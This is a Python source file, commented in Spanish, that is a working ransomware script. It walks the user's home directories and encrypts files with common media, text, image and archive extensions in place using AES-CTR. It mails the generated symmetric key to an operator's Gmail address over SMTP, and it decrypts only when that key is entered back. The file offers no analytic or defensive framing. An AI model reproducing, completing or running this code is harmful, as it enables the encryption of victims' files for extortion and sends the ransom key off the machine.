import socket
import os
import random
import hashlib
from Crypto.Util import Counter
from Crypto.Cipher import AES
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
home=os.environ['HOME']
carpetas=os.listdir(home)
carpetas=[x for x in carpetas if not x.startswith('.')] ##carpetas dentro del usuario donde estamos asi no afecta los archivos de window 
extensiones=['.mp3','.mp4','.avi','.jpeg','.zip','.dat','.rar','.txt','.png'] ##extensiones de archivos que se van a encryptar
def checkInternet():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('socket.io',80))
        s.close()
    except:
        exit()

def enviar_key():
    msg=MIMEMultipart()
    password="" ##clave del mail donde se va a mandar la llave simetrica 
    msg['From']='' ##Correo donde se va mandar la llave simetrica
    msg['To']='' ##Correo donde se va mandar la llave simetrica
    msg['Subject']='llave simetrica'

    msg.attach(MIMEText(open('key_file','r').read()))

    try:
        server=smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit
    except:
        pass
def get_hash(): ##generando el hash de encryptacion
    hash=os.environ['HOME']+os.environ['USER']+socket.gethostname()+str(random.randint(0,100000000000000000000000000000000000000000000000000000000000000))
    hash=hash.encode('utf-8')
    hash=hashlib.sha512(hash)
    hash=hash.hexdigest()
    
    new_key=[]
    for k in hash:
        if len(new_key)==32:
            hash=''.join(new_key)
            break
        else:
            new_key.append(k)
    return hash

def encrypt_decrypt(archivo,crypto,blocksize=16):  ##encryptando y desencryptando archivos
    with open(archivo,'r+b') as archivo_enc:
        contenido_sincifrar=archivo_enc.read(blocksize)
        while contenido_sincifrar:
            contenido_cifrado=crypto(contenido_sincifrar)
            if len(contenido_sincifrar)!= len(contenido_cifrado):
                raise ValueError('')
            archivo_enc.seek(- len(contenido_sincifrar),1)
            archivo_enc.write(contenido_cifrado)
            contenido_sincifrar=archivo_enc.read(blocksize)

     
    
def discover(key): ##desencriptar con la key los archivos
    file_list=open('file_list','w+')
    for carpeta in carpetas:
        ruta=home+'/'+carpeta
        for extension in extensiones:
            for rutabs, directorio, archivo in os.walk(ruta):
                for file in archivo:
                    if file.endswith(extension):
                        file_list.write(os.path.join(rutabs, file)+'\n')
    file_list.close()
     
    lista=open('file_list','r')
    lista=lista.read().split('\n')
    lista=[l for l in lista if not l==""]

    if os.path.exists('key_file'):
        key1=input('key: ')
        key_file=open('key_file','r')
        key=key_file.read().split('\n')
        key=''.join(key)

        if key1==key:
            c=Counter.new(128)
            crypto=AES.new(key,AES.MODE_CTR,counter=c)
            cryptarchives=crypto.decrypt
            for element in lista:
                encrypt_decrypt(element,cryptarchives)
        
    else:
        c=Counter.new(128)
        crypto=AES.new(key,AES.MODE_CTR,counter=c)
        key_file=open('key_file','w+')
        key_file.write(key)
        key_file.close()
        enviar_key()
        cryptarchives=crypto.encrypt
        for elemnt in lista:
            encrypt_decrypt(elemnt,cryptarchives)



def main():
    checkInternet()
    hash=get_hash()
    discover(hash)
    

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        exit()